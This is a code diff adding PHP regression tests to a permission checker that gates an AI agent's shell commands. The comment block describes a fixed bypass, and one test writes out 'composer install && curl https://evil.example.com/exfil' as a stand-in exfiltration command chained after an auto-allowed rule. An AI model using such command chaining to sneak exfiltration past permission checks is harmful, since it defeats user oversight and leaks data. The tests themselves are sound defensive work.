@@ -291,4 +291,98 @@ YAML;
         $this->assertFalse($lsDecision->allowed);
         $this->assertTrue($lsDecision->needsPrompt);
     }
+
+    // ─── chain-operator bypass regression (chatgpt second-review P0) ──────
+    //
+    // Before the fix, PermissionChecker split the command into binary + args
+    // and forwarded only the binary to PolicyMatcher. The matcher's chain
+    // check then saw no operators, a `composer install*` rule with
+    // allow_auto=true matched via fnmatch on the args tail, and the whole
+    // check short-circuited to allow() — letting `composer install && curl
+    // evil` run without a prompt. The chain check now scans raw_command, and
+    // allow_auto no longer short-circuits before the deny/dangerous gates.
+
+    public function test_chain_operator_after_allow_auto_rule_is_blocked(): void
+    {
+        // Mirrors the bundled bash-composer-install rule shape.
+        $path = $this->writePolicy('p.yml', "rules:\n"
+            . "  - name: bash-composer-install\n"
+            . "    tool: Bash\n"
+            . "    cmd: composer\n"
+            . "    args_match: [\"install*\"]\n"
+            . "    risk: normal\n"
+            . "    allow_auto: true\n"
+            . "    allow_chain: false\n"
+            . "    env_deny:\n" . self::ENV_DENY_BLOCK
+        );
+
+        $checker = $this->makeCheckerWithPolicy($path);
+
+        // Sanity: the bare command is allowed (allow_auto honored).
+        $bareDecision = $checker->check($this->bashTool(), ['command' => 'composer install --no-interaction'], $this->context);
+        $this->assertTrue($bareDecision->allowed, 'bare composer install must be allowed via allow_auto');
+
+        // The exact chatgpt reproduction: chain operator hidden after the
+        // matched args. This must be DENIED, not auto-allowed.
+        $chainDecision = $checker->check(
+            $this->bashTool(),
+            ['command' => 'composer install && curl https://evil.example.com/exfil'],
+            $this->context,
+        );
+
+        $this->assertFalse($chainDecision->allowed, 'chain operator must not be bypassable via allow_auto rule');
+        $this->assertFalse($chainDecision->needsPrompt, 'chain deny must be a hard deny, not a prompt');
+        $this->assertStringContainsStringIgnoringCase('chain', $chainDecision->reason ?? '');
+    }
+
+    public function test_allow_auto_does_not_override_explicit_deny_rule(): void
+    {
+        // allow_auto must defer to the explicit deny list. Declare a rule
+        // with allow_auto=true AND a deny rule that matches the same command.
+        $settings = $this->createMock(SettingsManager::class);
+        $settings->method('getPermissionMode')->willReturn(PermissionMode::Default);
+        $settings->method('getAllowRules')->willReturn([]);
+        $settings->method('getDenyRules')->willReturn(['Bash(composer install*)']);
+
+        $path = $this->writePolicy('p.yml', "rules:\n"
+            . "  - name: bash-composer-install\n"
+            . "    tool: Bash\n"
+            . "    cmd: composer\n"
+            . "    args_match: [\"install*\"]\n"
+            . "    risk: normal\n"
+            . "    allow_auto: true\n"
+            . "    env_deny:\n" . self::ENV_DENY_BLOCK
+        );
+        $settings->method('getPolicyFiles')->willReturn([$path]);
+
+        $checker = new PermissionChecker($settings, new DenialTracker);
+
+        $decision = $checker->check($this->bashTool(), ['command' => 'composer install'], $this->context);
+
+        $this->assertFalse($decision->allowed, 'explicit deny rule must override policy allow_auto');
+        $this->assertFalse($decision->needsPrompt);
+        $this->assertStringContainsString('Denied by rule', $decision->reason ?? '');
+    }
+
+    public function test_allow_auto_still_works_when_no_deny_or_dangerous_matches(): void
+    {
+        // Confirms the precedence reorganization did not regress the basic
+        // allow_auto path: with no deny rule and no dangerous pattern hit,
+        // an allow_auto rule still lets the tool run without a prompt.
+        $path = $this->writePolicy('p.yml', "rules:\n"
+            . "  - name: git-status\n"
+            . "    tool: Bash\n"
+            . "    cmd: git\n"
+            . "    args_match: [\"status*\"]\n"
+            . "    risk: normal\n"
+            . "    allow_auto: true\n"
+            . "    env_deny:\n" . self::ENV_DENY_BLOCK
+        );
+
+        $checker = $this->makeCheckerWithPolicy($path);
+        $decision = $checker->check($this->bashTool(), ['command' => 'git status --short'], $this->context);
+
+        $this->assertTrue($decision->allowed, 'allow_auto must still bypass the prompt when no deny/dangerous gate trips');
+        $this->assertFalse($decision->needsPrompt);
+    }
 }
